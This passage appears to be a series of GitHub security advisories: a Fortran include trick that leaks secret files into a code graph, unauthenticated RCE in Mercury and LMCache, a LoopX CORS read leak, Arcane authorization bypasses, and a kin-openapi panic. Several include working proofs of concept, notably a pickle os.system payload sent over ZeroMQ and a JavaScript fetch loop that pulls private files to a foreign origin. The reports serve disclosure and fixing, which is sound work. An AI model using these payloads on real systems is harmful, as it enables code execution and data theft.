Surfacing into the graph — `leak.F90` places the include in an identifier position via a free-form continuation so the leaked value becomes a node/edge:

    module m
    contains
    subroutine s
    use &
    #include "/path/to/token.secret"
    end subroutine s
    end module m

`extract_fortran()` on this file emits a node whose label is the entire single-line contents of `token.secret` and an `imports` edge to it. That node is written to `graph.json` / `GRAPH_REPORT.md` / the wiki and returned by the MCP `query_graph` / `get_node` / `get_neighbors` tools — i.e. exfiltrated into the agent's context and into persisted, shareable artifacts.

Fidelity note: Fortran is case-insensitive, so captured identifiers are lower-cased. Case-insensitive secrets (file paths, hostnames, usernames, hex tokens, connection-string fragments, and the mere existence/partial content of a readable file) leak cleanly; high-entropy case-sensitive blobs (base64/JWT) are partially corrupted by the lower-casing but still confirm readability and structure. Single-token-per-line secret files (API-key files, single-line credential/token files) leak that token in full (lower-cased). Requires `cpp`/gcc on PATH (near-ubiquitous on the dev/CI hosts graphify targets); it cleanly falls back to raw bytes when absent.

## Suggested fix

Mirror the containment approach already used elsewhere in the codebase (`_project_xml_is_safe`, `security.validate_graph_path`): before invoking cpp, scan the source for `#include` directives and **refuse or neutralise any include whose target is absolute or resolves outside the corpus/repo root**. Concretely, in `_cpp_preprocess`:

- Parse `#include "..."` / `#include <...>` directives.
- Resolve each target against the file's directory; if it is absolute, or its `.resolve()` escapes the scan root, strip that line (or fall back to `path.read_bytes()` with no preprocessing).
- Only allow includes that resolve to a path inside the corpus root.

A blunter but safe alternative is to strip all `#include` lines before preprocessing (macros still expand; cross-file includes lose fidelity but no host files can be read). Running cpp inside a filesystem sandbox (bwrap/unshare with only the corpus mounted) would also close it but is heavier.

## Detected by

Aeon vuln-scanner. Semgrep flagged the Fortran subprocess path; manual review of the F-007 mitigation plus an empirical `cpp` repro confirmed the bypass.

titolo: GHSA-rv4m-xm3f-3ccq: Mercury: Unauthenticated Remote Code Execution via /api/kernels
descrizione:
Mercury runs a JupyterLab server with **anonymous access by default** (`mercury_app/__main__.py` sets `--IdentityProvider.token=''` when no `--token`/`MERCURY_TOKEN` is given; when tokenless it also sets `--ServerApp.disable_check_xsrf=True`). It relies on a **blocklist** (`mercury_app/block_handler.py` `BLOCKED_PATTERNS`: `/lab`, `/api/terminals`, `/api/shutdown`, `/files`) to keep anonymous users off dangerous Jupyter endpoints.

## The vulnerability
`/api/kernels` is **NOT** in the blocklist (and cannot be — Mercury needs kernels to run notebooks), and `patch_kernel_websocket_handler()` (`mercury_app/idle_timeout.py`) only tracks the idle-timeout: it wraps `on_message` to call `self.application._timeout_manager.touch()` and then invokes the original handler with **no filtering of `execute_request`**. So any unauthenticated network client can:

```
POST /api/kernels {"name":"python3"}        -> 201, returns kernel id
open websocket /api/kernels/<id>/channels
send an execute_request with arbitrary code -> arbitrary Python execution = RCE
```

## Distinct from GHSA-f8c7-rwf9-fmgm (incomplete fix)
GHSA-f8c7 was "Unauthenticated RCE via `/api/terminals`" — a missing-comma blocklist bypass. Its fix (add the comma so `/api/terminals` is blocked) does **NOT** address `/api/kernels`, which remains exploitable. The blocklist approach is fundamentally unable to cover kernels, so this is not a variant that another blocklist entry fixes.

## Runtime-proven (on the patched version)
On **mercury 3.2.4** — the release that fixed GHSA-f8c7 — with the default (tokenless) config, as an unauthenticated client: `POST /api/terminals` returns **403** (the f8c7 fix is present), but `POST /api/kernels` returns **201**; opening the kernel websocket and sending an `execute_request` executed attacker-supplied Python (ran `whoami` as the server process user and wrote a marker file `/tmp/PWNED_MERCURY_RCE`). Full unauthenticated remote code execution. Deterministic PoC (client script + notebook) included.

## Impact
Unauthenticated, network-reachable arbitrary code execution as the Mercury server process user on every default deployment — complete compromise of the host/container and any data/secrets it can reach. 

## Fix
The blocklist cannot secure an anonymous kernel-backed server. Require real per-request authentication (a token or password) by default, or restrict the kernel message channel so anonymous websocket clients cannot issue `execute_request` outside Mercury's own controlled execution flow.

## Dedup (3-method)
OSV.dev CLEAN(0) for `mercury` and `mljar-mercury`; the repo's only advisory (GHSA-f8c7-rwf9-fmgm) covers `/api/terminals` only (description does not mention kernels); no issue/PR describes the `/api/kernels` RCE (#219/#134/#262 are "add auth" feature requests that merely confirm anonymous-by-default). Sink independently confirmed on current HEAD (blocklist omits `/api/kernels`; `token=''` default; `patch_kernel_websocket_handler` does no execute filtering).

Finder: Abdullah Kareem (GitHub: CyberKareem).

titolo: GHSA-vx2m-gpq4-8j5q: LoopX serve-status permissive CORS policy exposes control-plane state and private Markdown files
descrizione:
## Summary

`loopx serve-status` sends `Access-Control-Allow-Origin: *` on **every** response,
including its unauthenticated `GET` routes. Because the endpoint is unauthenticated and
bound to a fixed, well-known loopback port, **any website the operator visits can read
LoopX control-plane state and the contents of Markdown files inside every registered goal
repo**, using a plain `fetch()` with no user interaction.

The write endpoints are *not* affected — they are correctly Origin-checked. This report is
strictly about the **read** paths.

## Impact

While `loopx serve-status` is running, a page on any origin can run:

```js
// no interaction, no preflight, no credentials needed
const s = await (await fetch('http://127.0.0.1:8766/status.json')).json();
for (const g of s.goals ?? []) {
  const m = await (await fetch(
    `http://127.0.0.1:8766/review-material?goal_id=${g.id}&path=design-notes.md`
  )).json();
  exfiltrate(m.content);
}
```

and read back:

* **`GET /status.json`** — the whole status projection: goal ids, run history, and local
  absolute paths (`registry`, `runtime_root`). With `--global-registry` this covers
  **every project registered on the machine**, not just one.
* **`GET /review-material?goal_id=…&path=…`** — the *content* of any `.md`/`.markdown`
  file under a goal's repo root, state dir, or runtime dir. In practice that is the
  operator's private design notes, handoff docs, and evidence write-ups.
* **`GET /`** — endpoint discovery, including which write APIs are enabled.
* **`POST /control-plane/configure-goal/dry-run`** — this route has **no Origin check at
  all**, and `do_OPTIONS` returns `Access-Control-Allow-Headers: Content-Type`, so a
  cross-origin JSON POST passes preflight. The response leaks the `before`/`after`
  control-plane configuration for a goal. (It does not write — I verified `written=false`.)

`docs/public-private-boundary.md` classifies "local absolute paths", "task ids", "raw logs
and metrics" and "active goal state that reveals current user context" as material that
must stay private. All of it is currently readable by any origin.

Two things make this more than theoretical:

1. **Fixed default ports.** `8765` (project) and `8766` (global) are hardcoded defaults, so
   an attacker page can simply try both — no discovery step needed.
2. **It is documented as a persistent service.** `docs/guides/getting-started.md` documents
   `loopx serve-status`, and `scripts/macos-dashboard-launchagent.sh` installs a LaunchAgent
   that keeps `serve-status --global-registry --port 8766` running **after every login**. For
   anyone following that guide, this is an always-on, machine-wide read surface.

I have graded this **High** on the basis of zero-interaction exfiltration of private local
material from a persistent service. It is read-only and scope-limited, so if you read the
exposure as lower I would not argue the point — you know your users' setups better than I do.

## Location

`loopx/status_server.py:136-146` — `StatusRequestHandler._send_json()`:

```python
def _send_json(self, payload: dict[str, Any], *, status: int = 200) -> None:
    ...
    self.send_header("Access-Control-Allow-Origin", "*")   # <-- line 142
```

`_send_json` is the single response path for *all* routes, so the wildcard is applied to
`/status.json`, `/review-material`, `/healthz`, `/` and the dry-run POSTs alike.
`do_OPTIONS` (`:148-153`) repeats it.

Confirmed present at `main` HEAD (`b0c8e315`, blob `c9e53d1a`) at the time of writing.

## What is NOT affected (I checked, so you don't have to)

I tried to refute this before reporting. These controls all hold:

* **Writes are properly defended.** With `--enable-reward-write-api` and
  `--enable-control-plane-write-api` both on, `POST /reward/append` and
  `POST /control-plane/configure-goal/apply` return **403 "only accepts loopback browser
  origins"** for a foreign `Origin`. `is_loopback_origin()` does its job. There is no
  cross-origin write, and DNS rebinding does not defeat it either (the rebound page still
  carries its own non-loopback origin).
* **No path traversal.** `../../../../etc/hostname` → 400; an absolute `.md` outside the
  goal roots → 400 ("outside the goal repo/state/runtime roots"). `path_is_under()` is
  correct.
* **Extension allowlist holds.** `secrets.env` inside the repo → 400. Only `.md`/`.markdown`
  can be read.
* **Dry-run does not write.** `configure_goal_with_global_sync(execute=False)` returns
  before any write; I observed `written=false`.

So the exposure is confined to: status JSON + Markdown under registered goal roots. That is
still private material, but it is not arbitrary file read and it is not remote code
execution.

## Proof of concept

Run against an unmodified clone at HEAD, **default flags** (no write APIs enabled):

```
GET /healthz                 Origin: https://evil.example  -> 200  ACAO: '*'
GET /                        Origin: https://evil.example  -> 200  ACAO: '*'
GET /status.json             Origin: https://evil.example  -> 200  ACAO: '*'
GET /review-material?goal_id=victim-goal&path=internal-design-notes.md
                             Origin: https://evil.example  -> 200  ACAO: '*'
   content: "# Internal notes\n\nPROD_DB_HOST=db.internal.corp\nCONFIDENTIAL: ..."
```

The file content came back verbatim to a foreign origin. Matched controls from the same
harness, with **both write flags enabled** (i.e. the configuration most favourable to the
current design):

```
POST /reward/append                        Origin: https://evil.example -> 403 (origin check)
POST /control-plane/configure-goal/apply   Origin: https://evil.example -> 403 (origin check)
GET  /review-material  ../../../../etc/hostname                        -> 400 (traversal blocked)
GET  /review-material  <abs path outside roots>.md                     -> 400 (root check)
GET  /review-material  secrets.env                                     -> 400 (extension check)
GET  /status.json                          Origin: https://evil.example -> 200 ACAO '*'  <-- still readable
```

I am happy to send the exact harness script if it is useful; it is ~120 lines of stdlib
Python and touches no file in the repo.

## Suggested fix

You already have the right predicate in this file — `is_loopback_origin()`. The minimal fix
is to stop emitting the wildcard and instead echo the request origin only when it passes
that check:

```python
def _send_json(self, payload: dict[str, Any], *, status: int = 200) -> None:
    body = json.dumps(payload, ensure_ascii=False, indent=2).encode("utf-8")
    self.send_response(status)
    self.send_header("Content-Type", "application/json; charset=utf-8")
    self.send_header("Content-Length", str(len(body)))
    self.send_header("Cache-Control", "no-store")
    origin = self.headers.get("Origin")
    if origin and is_loopback_origin(origin):
        self.send_header("Access-Control-Allow-Origin", origin)
        self.send_header("Vary", "Origin")
    # no Origin header (curl, the CLI, a same-origin fetch) -> send no ACAO at all
    self.end_headers()
    self.wfile.write(body)
```

and the same in `do_OPTIONS`. This keeps the dashboard working — it is served from
`http://127.0.0.1:5174` and fetches `127.0.0.1:8765/8766`, which is cross-origin between two
loopback ports, which I assume is exactly why the wildcard was added — while denying every
non-loopback origin.

Two optional hardening steps, if you want them:

* Apply the existing `is_loopback_origin()` check to `POST /control-plane/configure-goal/dry-run`
  and `POST /reward/dry-run` too, so the config projection is not readable cross-origin.
* Add a `Host` header check (reject a `Host` that is not loopback) to close DNS rebinding
  against clients that do not send `Origin`.

## Scope of review

Reviewed 26/52 identified entrypoints across 758 files (360,618 LOC) of the `loopx` package
and dashboard; tools: semgrep 1.172.0, trufflehog 3.96.0, osv-scanner 2.4.0, plus a manual
dataflow pass. Skipped: `tests/`, `regression/`, `examples/`, `docs/`, and the benchmark
adapters under `loopx/benchmark_adapters/`. Coverage confidence: partial.

Other things I looked at and did **not** find a problem with, in case it saves you time:
self-update (`curl | bash` is over HTTPS to a hardcoded `raw.githubusercontent.com` URL; the
`LOOPX_ARCHIVE_URL` override requires environment control, i.e. privileges the attacker
would have to already have); project/slash-command skill installation (strict id regex plus
`_assert_project_boundary()` containment); the `shell=True` worker tick (the value is a
user-configured shell command by design, and `demo_supervisor.build_visible_worker_turn_command`
passes the objective through `shlex.quote`); outbound SSRF surfaces (`content_ops/surface.py`
blocks private/loopback/link-local ranges and refuses redirects). No `pickle`, `yaml.load`,
`eval`, or `os.system` anywhere in the package.

3 dependency advisories exist in dev/docs tooling only (`pymdown-extensions`, `idna`,
`postcss`); none are reachable from the runtime package, which declares no dependencies, so
I have not opened a bump PR.

## Detected by

[Aeon](https://github.com/aeonfun/aeon), an automated security review. Findings are
reproduced at HEAD and manually verified before reporting. Reported privately via GitHub PVR
because that is the intake channel your `SECURITY.md` designates.

titolo: GHSA-pw5q-rjx4-7f7p: Arcane: Delegated users:update permission allows admin account takeover via password reset (no privilege-hierarchy check)
descrizione:
## Summary
A user holding the delegated `users:update` permission can reset the global administrator's password and take over the admin account. `UpdateUser` sets the target user's `PasswordHash` from the request body for ANY target with no comparison of caller-vs-target privilege. Because role assignment and role CRUD are deliberately gated by `RequireGlobalAdmin`, `users:update` is intended to sit BELOW admin (profile management); this finding defeats that separation.

## Root Cause
`UpdateUser` (handler `backend/api/handlers/users.go:317-323`) loads the target by ID and sets `userModel.PasswordHash` from the request body for any user, then `userService.UpdateUser` (`user_service.go:174`) simply `tx.Save`s — with NO actor-vs-target privilege comparison. The only `IsGlobalAdmin` guard (`user_service.go:345`) is a last-admin check inside `DeleteUser`, not the update path. Role assignment / role CRUD are `RequireGlobalAdmin` (`backend/pkg/authz/permissions.go:27-33`), proving `users:update` is intended below admin.

## Impact
Complete administrator account takeover (C:H/I:H/A:H) by any holder of the delegated `users:update` permission.

## Proof of Concept
1. Admin delegates a custom "User Manager" role with `users:update`.
2. `PUT /users/{adminId}` with `{"password":"attacker123"}`.
3. `POST /auth/login {"username":"arcane","password":"attacker123"}` → admin session.

## Attack Chain
1. Action: admin delegates custom role with `users:update`. Guard: role creation is `RequireGlobalAdmin`. Bypass: intended delegation (holder is meant to manage profiles, not seize admin).
2. Action: `PUT /users/{adminId}` `{"password":"attacker123"}`. Guard: `RequirePermission(users:update)` (`users.go:154`). Bypass: holder has it; no hierarchy check (`users.go:317-323`, `user_service.go:174` unconditional Save).
3. Action: `POST /auth/login` as admin → admin session.

## Bypass Evidence
- `users.go:317-323` sets `PasswordHash` for any target; `user_service.go:174-194` has no actor/target privilege comparison.
- Only `IsGlobalAdmin` hits are `DeleteUser`'s last-admin guard and DTO flags (grep).
- `users:update` is org-level, held by no built-in non-admin role (`permissions.go:24`).

## Affected Versions
`<= 2.5.0`.

Reported by **zx (Jace)** — GitHub: @manus-use

titolo: GHSA-mp22-58ff-6fhr: Arcane: Environment access token bypasses the admin-required authorization gate on `/api/debug/pprof`
descrizione:
## Summary

Arcane v2.10.2 contains an authorization inconsistency in `AuthMiddleware.managerAuth`.

When a request supplies a valid environment access token through the `X-Arcane-Agent-Token` header, `managerAuth` resolves the associated environment, installs an environment-scoped permission set, and immediately calls `next(c)`.

This occurs before the middleware evaluates the `AdminRequired` option and verifies that the caller is a global administrator.

As a result, an environment-scoped access token can access routes protected with `WithAdminRequired()`, despite the corresponding `EnvironmentPermissionSet` intentionally containing no global or sudo permissions.

In v2.10.2, the affected admin-only surface is the manager's Go `pprof` diagnostic interface under:

`/api/debug/pprof/*`

This exposes diagnostic and runtime profiling information that the application explicitly intends to restrict to global administrators.

The issue is an incorrect authorization vulnerability (CWE-863).

## Details

### 1. Environment access tokens are accepted by the manager authentication middleware

The production authentication middleware is configured with an environment access-token resolver:

`backend/internal/di/providers.go`

Conceptually, the middleware is constructed as:

```go
auth.NewAuthMiddleware(authService, cfg).
    WithApiKeyValidator(apiKey).
    WithEnvironmentAccessTokenResolver(env).
    WithPermissionResolver(role)
```

Therefore, the `X-Arcane-Agent-Token` authentication path is active in the production manager.

### 2. The environment-token path returns before authorization options are evaluated

The relevant logic is in:

`backend/internal/auth/middleware.go`

`managerAuth` first checks the `X-Arcane-Agent-Token` header.

When the token resolves to an environment, the middleware installs an environment-scoped permission set and immediately continues processing:

```go
if agentToken := req.Header.Get(utils.HeaderAgentToken); agentToken != "" {
    if env, ok := m.resolveEnvironmentAccessToken(ctx, agentToken).Get(); ok {
        environmentScopedInternal(c, env)
        return next(c)
    }
}
```

The important part is the unconditional:

```go
return next(c)
```

The normal authentication path later evaluates the middleware's `AdminRequired` option:

```go
ps := m.resolvePermissionsOrDeny(ctx, user)

if m.options.AdminRequired && !ps.IsGlobalAdmin() {
    return c.JSON(http.StatusForbidden, common.APIError{
        Code:    "FORBIDDEN",
        Message: "You don't have permission to access this resource",
    })
}
```

The environment-token branch never reaches this check.

Consequently, `WithAdminRequired()` has no effect when authentication succeeds through a valid environment access token.

This creates an authorization inconsistency between authentication mechanisms:

- normal user/session authentication → `AdminRequired` is enforced;
    
- environment access-token authentication → `AdminRequired` is bypassed.
    

### 3. Environment tokens are intentionally not global-administrator credentials

`backend/pkg/authz/permission_set.go` defines the effective permissions assigned to an environment access token.

`EnvironmentPermissionSet(envID)` grants environment-scoped permissions only for the specified environment:

```go
func EnvironmentPermissionSet(envID string) *PermissionSet {
    ps := NewPermissionSet()

    if envID == "" {
        return ps
    }

    for _, p := range AllPermissions() {
        if IsEnvScoped(p) {
            ps.AddEnv(envID, p)
        }
    }

    return ps
}
```

The implementation explicitly establishes that these credentials do not receive global or sudo permissions.

Therefore, an environment access token should not satisfy a global-administrator authorization requirement.

The early return in `managerAuth` bypasses this intended privilege boundary.

### 4. `/api/debug/pprof/*` explicitly requires global-administrator authorization

The diagnostic routes are registered in:

`backend/api/ws/diagnostics.go`

The `pprof` group is protected using:

```go
pprofGroup := group.Group(
    "/debug/pprof",
    authMiddleware.WithAdminRequired().Add(),
)
```

The source also documents the intended authorization requirement by noting that pprof keeps the stricter admin-required gate.

The group exposes handlers including:

```text
/api/debug/pprof/
/api/debug/pprof/cmdline
/api/debug/pprof/profile
/api/debug/pprof/symbol
/api/debug/pprof/trace
/api/debug/pprof/heap
/api/debug/pprof/goroutine
/api/debug/pprof/allocs
/api/debug/pprof/block
/api/debug/pprof/mutex
/api/debug/pprof/threadcreate
```

Named profiles are dispatched through `pprof.Handler`.

Because `WithAdminRequired()` is bypassed by the environment-token branch, a valid environment access token can reach these handlers even though its permission set is not globally privileged.

### 5. Other middleware does not restore the missing authorization check

The CSRF middleware recognizes `X-Arcane-Agent-Token` as a header-based credential and does not apply the normal cross-origin CSRF validation to such requests.

Additionally, the environment proxy middleware passes through requests that do not target an `/environments/{id}/...` path.

Therefore a request to:

```text
/api/debug/pprof/*
```

can proceed to `managerAuth`, enter the environment-token authentication branch, and reach the pprof handler without another global-administrator authorization check being applied.

## Source-to-sink authorization path

The vulnerable control flow is:

```text
X-Arcane-Agent-Token
        |
        v
environment access token resolver
        |
        v
environment resolved successfully
        |
        v
EnvironmentPermissionSet(environmentID)
        |
        v
return next(c)
        |
        |  AdminRequired check is skipped
        v
/api/debug/pprof/*
        |
        v
net/http/pprof handler
```

The security boundary violation occurs at the early `return next(c)`.

## Proof of Concept

### Preconditions

The test requires:

1. A valid Arcane environment access token.
    
2. An Arcane manager running the affected code.
    
3. No global-administrator account or credentials.
    

### Test 1 — environment access token

Send a request to an admin-protected pprof endpoint using only an environment access token:

```http
GET /api/debug/pprof/heap?debug=1 HTTP/1.1
Host: arcane.example.com
X-Arcane-Agent-Token: <VALID_ENVIRONMENT_ACCESS_TOKEN>
```

No administrator session cookie or administrator Bearer token is supplied.

### Vulnerable behavior

On an affected instance, the request is expected to reach the pprof handler instead of being rejected by `WithAdminRequired()`.

A successful response demonstrates that the environment-token authentication branch bypasses the administrator requirement.

For example, the response may contain the Go heap profiling output generated by `net/http/pprof`.

### Test 2 — non-admin user contrast case

Send the same request using a normal authenticated non-global-admin user:

```http
GET /api/debug/pprof/heap?debug=1 HTTP/1.1
Host: arcane.example.com
Authorization: Bearer <NON_ADMIN_ACCESS_TOKEN>
```

The expected result is:

```http
HTTP/1.1 403 Forbidden
```

with an authorization error indicating that the user does not have permission to access the resource.

This contrast demonstrates the authorization inconsistency:

```text
environment-scoped token
        -> admin gate skipped
        -> pprof handler reached

normal non-admin user
        -> admin gate evaluated
        -> HTTP 403
```

### Expected secure behavior

A valid environment access token should receive:

```http
HTTP/1.1 403 Forbidden
```

for every route protected with `WithAdminRequired()`.

Only a caller whose effective permission set satisfies `IsGlobalAdmin()` should be allowed to access these routes.

## Impact

An attacker who obtains a valid environment access token can cross the intended authorization boundary between an individual environment and manager-wide administrative functionality.

In the currently identified route configuration, this allows unauthorized access to the manager's Go `pprof` diagnostic endpoints.

Depending on the requested profile, these endpoints can expose internal runtime and diagnostic information such as:

- goroutine stack traces;
    
- function and package names;
    
- allocation and heap profiling information;
    
- CPU profiling information;
    
- runtime execution traces;
    
- process command-line information;
    
- mutex, block, thread and allocation profiling data.
    

This information is normally restricted to global administrators by Arcane's explicit use of `WithAdminRequired()`.

Some profiling operations may also impose additional CPU, memory, or tracing overhead while being collected.

Importantly, this report does **not** assume that Go's pprof heap endpoint is an arbitrary raw-process-memory dump. Direct extraction of session tokens, environment access tokens, passwords, or other credentials from pprof output has not been demonstrated and is therefore not claimed as part of the confirmed impact.

The confirmed security issue is the authorization bypass itself and the resulting unauthorized exposure of administrator-restricted diagnostic functionality.

## Root Cause

The root cause is that authentication through an environment access token takes an early-success path:

```go
environmentScopedInternal(c, env)
return next(c)
```

before common middleware authorization options are evaluated.

As a result, authorization requirements configured on the middleware are dependent on which authentication mechanism is used.

Authentication establishes the identity and scope of the caller, but route-level authorization requirements such as `AdminRequired` should subsequently be applied consistently regardless of the authentication mechanism.

## Remediation

The environment-token authentication path should not call `next(c)` before the configured authorization requirements have been evaluated.

One approach is to resolve the environment token into its `EnvironmentPermissionSet` and then pass that permission set through the same authorization-option evaluation used by other authentication mechanisms.

For example, logically:

```go
if envTokenIsValid {
    ps := authz.EnvironmentPermissionSet(env.ID)

    if m.options.AdminRequired && !ps.IsGlobalAdmin() {
        return forbidden
    }

    environmentScopedInternal(c, env)
    return next(c)
}
```

Because an `EnvironmentPermissionSet` intentionally has no global permissions, an environment token would then correctly receive HTTP 403 for `WithAdminRequired()` routes.

As additional defense in depth, the pprof endpoints could explicitly reject environment access tokens and other environment-scoped authentication mechanisms, allowing access only through authentication mechanisms capable of representing a global administrator.

It may also be worth considering whether pprof should be exposed in production by default or enabled only through an explicit diagnostic configuration option.

## Regression Tests

The following cases should be covered:

```text
Valid environment access token
+ /api/debug/pprof/heap
=> 403

Normal authenticated non-admin user
+ /api/debug/pprof/hea
=> 403

Unauthenticated request
+ /api/debug/pprof/heap
=> 401/403

Global administrator
+ /api/debug/pprof/heap
=> 200
```

More generally, tests should verify that every authentication mechanism is subject to middleware options such as `AdminRequired`.

The issue could also broadly be categorized as an authorization-check bypass caused by inconsistent authorization handling across authentication paths..
 

No claim of credential extraction, arbitrary process-memory disclosure, or global-administrator takeover is made unless separately demonstrated through dynamic testing.

titolo: GHSA-w5f2-9q9c-ff4h: LMCache: Remote code execution via unsafe deserialization in multiprocess mode transport
descrizione:
### Summary

LMCache is vulnerable to Unauthenticated Remote Code Execution via Pickle Deserialization on the Multiprocess ZMQ Transport



### Details

LMCache multiprocess mode, also called distributed mode, opens an unauthenticated ZeroMQ ROUTER so worker processes can register and share KV cache blocks. The intended clients are sibling LMCache processes. There is no CURVE, ZAP, password, or message authentication on that socket. LMCache used only inside a vLLM process does not open this port. The transport binds to localhost unless the operator sets a routable address with --host, which is how multi-node deployments let peers connect. The 9.8 score is for that routable configuration. A stock single-host install that leaves the default bind is not reachable from other machines.

Messages on the socket are msgpack. Extension code 1 is registered for DeviceIPCWrapper and is passed to DeviceIPCWrapper.Deserialize in lmcache/v1/platform/base/ipc_wrapper.py, which calls pickle.loads. That hook runs from ext_hook in lmcache/v1/multiprocess/custom_types.py while the server is still decoding REGISTER_KV_CACHE arguments, before the handler runs. A single unauthenticated ZMQ DEALER message to the transport port (default 5555) therefore executes code as the user the LMCache process runs as. Official container images run that process as root.

The decode path shipped in v0.3.9. It is still present in the latest PyPI release, v0.5.5, in the v0.5.6 release candidates through v0.5.6rc3, and on the dev branch as of 2026-10-07. No fixed version has been published.



### Proof of concept

Step 1 - Start multiprocess mode bound to a routable address


This is the documented multi-node setting. The ZMQ transport listens on port 5555.

```
   python -m lmcache.v1.multiprocess.http_server \
    --http-host 127.0.0.1 --http-port 8080 \
    --host 0.0.0.0 --port 5555 \
    --l1-size-gb 0.25 --eviction-policy LRU \
    --hash-algorithm blake3 --instance-id mp-node-01
```
Step 2 - Build a REGISTER_KV_CACHE frame whose cache slot is a pickle


Payload slot 1 is a msgpack extension with code 1. The server unpickles that body while it is still decoding arguments. The command writes id to /tmp/zmq_pwn.

```
import os
import pickle
import msgspec
import zmq

class EvilPayload:
    def __init__(self, cmd):
        self.cmd = cmd
    def __reduce__(self):
        return (os.system, (self.cmd,))

evil_pickle = pickle.dumps(EvilPayload("id > /tmp/zmq_pwn 2>&1"))

REGISTER_KV_CACHE = 1
EXT_CODE = 1
NUM_PAYLOADS = 7
KVCACHE_INDEX = 1

b_uid = msgspec.msgpack.encode(0)
b_type = msgspec.msgpack.encode(REGISTER_KV_CACHE)
payloads = [msgspec.msgpack.encode(None)] * NUM_PAYLOADS
payloads[0] = msgspec.msgpack.encode(0)
payloads[KVCACHE_INDEX] = msgspec.msgpack.encode(
    [msgspec.msgpack.Ext(EXT_CODE, evil_pickle)]
)
frames = [b_uid, b_type, *payloads]
```
Step 3 - Send the frame


```
ctx = zmq.Context()
s = ctx.socket(zmq.DEALER)
s.connect("tcp://127.0.0.1:5555")
s.send_multipart(frames)
```
The pickle runs during argument decode. The server then logs a type error for REGISTER_KV_CACHE because the handler expected a DeviceIPCWrapper and received the return value of os.system. That error is after the command has already run.


Step 4 - Confirm the command ran as the LMCache user


```
cat /tmp/zmq_pwn
```
Expected output on an official image, where the process runs as root:

```
uid=0(root) gid=0(root) groups=0(root)
```

### Impact

LMCache's multiprocess (MP) mode uses a ZeroMQ transport (port 5555 by default) that does not require authentication. Device IPC descriptors received on this transport were deserialized with `pickle.loads`. An attacker who can reach the transport port can send a single crafted message and execute arbitrary code with the privileges of the LMCache process.

By default the transport binds to localhost, and single-process (in-process) mode does not open the port. Deployments are exposed when the transport binds a routable address, as multi-node setups do. The project's example Kubernetes deployment bound all interfaces, and official container images ran as root, so deployments based on them should be treated as exposed.

Affected: 0.3.9 through 0.5.5, the 0.5.6 release candidates, and `dev` branch builds before PR #5644.


### Patches

Fixed in **0.5.6**. Pickle has been replaced with versioned, typed MessagePack descriptors that are validated before use; the device wrapper type is selected from a fixed local allowlist, and there is no pickle fallback. Both the ZeroMQ and gRPC transport paths are covered.

The wire format has changed: upgrade all workers and servers together.

0.5.6 also binds the example Kubernetes deployment to localhost (PR #5684) and runs official images as a non-root user (PR #5685).

### Workarounds

Until you can upgrade:

- Do not bind the transport to a routable address; keep it on localhost or a trusted cluster network.
- Restrict access to the transport port (5555 by default) with firewall rules or network policies.
- Run LMCache as a non-root user (build from the provided Dockerfile if needed).

If the transport port was ever reachable from an untrusted network, treat the host as potentially compromised: review connections to the port, check for unexpected processes or outbound connections from the LMCache process, rotate reachable credentials, and redeploy from clean images.

titolo: GHSA-74vm-87hj-r66f: kin-openapi openapi3filter: nil-pointer panic in ValidateResponse on a response header declared with content
descrizione:
## Summary

`ValidateResponse` panics on a nil pointer when a spec declares a response header with `content` instead of `schema`. `doc.Validate()` accepts that document, so the crash comes from a spec the library just called valid.

Same class as GHSA-jpcw-4wr7-c3vq, which covered the request-parameter case in v0.144.0; this is the response-header path.

Affects `github.com/getkin/kin-openapi` `<= v0.145.0`. Reproduced on master `947498e5a6bd`, Go 1.26.

## Details

A `content`-typed response header has `headerRef.Value.Schema == nil`.

`validate_response.go:181` passes it straight through:

```go
if decodedValue, found, err = decodeValue(dec, headerName, sm, headerRef.Value.Schema, headerRef.Value.Required); err != nil {
```

and `req_resp_decoder.go:273` is where it lands:

```go
if len(schema.Value.AllOf) > 0 {
```

Two things I checked rather than assumed. The response does not need to carry the header; declaring it is enough, and then every call for that operation panics. And the body path is fine, `:114` returns early on a nil schema, so this is headers only. The PoC keeps the body case as a control.

## PoC

Drop into `openapi3filter/` and run:

```
go test ./openapi3filter/ -run NilSchema -v
```

```go
package openapi3filter_test

import (
	"context"
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/getkin/kin-openapi/openapi3"
	"github.com/getkin/kin-openapi/openapi3filter"
	"github.com/getkin/kin-openapi/routers"
)

const specBody = `
openapi: 3.0.3
info: {title: poc, version: "1.0.0"}
paths:
  /x:
    get:
      responses:
        "200":
          description: ok
          content:
            application/json: {}
`

const specHeader = `
openapi: 3.0.3
info: {title: poc, version: "1.0.0"}
paths:
  /x:
    get:
      responses:
        "200":
          description: ok
          headers:
            X-Thing:
              content:
                application/json: {}
`

func validatedInput(t *testing.T, spec string, hdr http.Header) *openapi3filter.ResponseValidationInput {
	t.Helper()
	doc, err := openapi3.NewLoader().LoadFromData([]byte(spec))
	if err != nil {
		t.Fatalf("load: %v", err)
	}
	if err := doc.Validate(context.Background()); err != nil {
		t.Fatalf("doc.Validate rejected the spec, so this repro proves nothing: %v", err)
	}
	op := doc.Paths.Find("/x").Get
	req := httptest.NewRequest(http.MethodGet, "/x", nil)
	return &openapi3filter.ResponseValidationInput{
		RequestValidationInput: &openapi3filter.RequestValidationInput{
			Request: req,
			Route:   &routers.Route{Spec: doc, Operation: op, Method: http.MethodGet, Path: "/x"},
		},
		Status: 200,
		Header: hdr,
		Body:   io.NopCloser(strings.NewReader(`{}`)),
	}
}

// Control: body path returns early on a nil schema.
func TestControl_ResponseBodyNilSchema(t *testing.T) {
	in := validatedInput(t, specBody, http.Header{"Content-Type": {"application/json"}})
	defer func() {
		if r := recover(); r != nil {
			t.Errorf("body path panicked, expected clean return: %v", r)
		}
	}()
	if err := openapi3filter.ValidateResponse(context.Background(), in); err != nil {
		t.Errorf("body path returned %v, expected nil", err)
	}
}

// The response does not carry X-Thing. Declaring the header is enough.
func TestResponseHeaderNilSchema(t *testing.T) {
	in := validatedInput(t, specHeader, http.Header{"Content-Type": {"application/json"}})
	if err := openapi3filter.ValidateResponse(context.Background(), in); err != nil {
		t.Fatalf("no panic; got err = %v (already fixed?)", err)
	}
}
```

Output:

```
=== RUN   TestControl_ResponseBodyNilSchema
--- PASS: TestControl_ResponseBodyNilSchema (0.00s)
=== RUN   TestResponseHeaderNilSchema
--- FAIL: TestResponseHeaderNilSchema (0.00s)
panic: runtime error: invalid memory address or nil pointer dereference [recovered, repanicked]
[signal SIGSEGV: segmentation violation code=0x1 addr=0x20 pc=0x7f6d2a]

github.com/getkin/kin-openapi/openapi3filter.decodeValue(...)
	/src/openapi3filter/req_resp_decoder.go:273 +0x4a
